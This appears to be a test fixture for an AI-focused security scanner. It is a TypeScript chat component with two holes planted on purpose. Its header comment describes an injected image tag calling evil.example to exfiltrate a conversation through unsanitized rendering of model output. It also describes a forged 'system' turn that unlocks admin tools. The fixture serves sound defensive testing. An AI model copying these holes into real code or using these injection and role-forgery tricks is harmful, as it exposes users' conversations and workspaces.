// FIXTURE: llm lens, should-flag (RECALL)
// A chat view renders model output as raw HTML, and the model's context includes a shared document
// another user wrote. Planted:
//   1. model output goes through marked() into dangerouslySetInnerHTML with no sanitizer, so an
//      injected <img src="https://evil.example/?d=..."> exfiltrates the conversation and a <script>
//      or event handler runs in the viewer's session -> llm:unsafe-render (high)
//   2. the caller-supplied history keeps its own role field, so a client can submit a forged
//      "system" turn that switches on the admin tool list -> llm:role-forgery (medium)
// Expected verdict: FLAG both.
import { marked } from 'marked';

type Turn = { role: string; content: string };

export function buildMessages(history: Turn[], sharedDoc: string) {
  const isAdmin = history.some(t => t.role === 'system' && t.content.includes('mode: admin'));
  return {
    tools: isAdmin ? ['delete_workspace', 'export_all_users'] : ['search_docs'],
    messages: [...history, { role: 'user', content: `Summarise this shared doc:\n${sharedDoc}` }],
  };
}

export function AssistantMessage({ text }: { text: string }) {
  return <div className="prose" dangerouslySetInnerHTML={{ __html: marked(text) as string }} />;
}
